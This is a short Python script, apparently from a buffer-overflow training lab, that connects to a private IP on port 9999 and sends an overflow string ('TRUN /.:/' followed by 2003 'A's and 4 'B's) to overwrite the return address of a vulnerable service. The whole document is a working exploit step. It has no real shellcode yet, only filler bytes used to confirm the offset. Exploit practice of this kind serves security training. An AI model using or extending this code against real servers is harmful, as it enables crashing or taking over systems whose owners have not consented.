#!/bin/python

import sys
import socket
from time import sleep

shellcode = "A"* 2003 + "B"* 4
try:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.40.135',9999))
      s.send(('TRUN / .:/' + shellcode))
      s.close()
except:
      print "Error connecting to server"
      sys.exit()                  
                                   
                          
              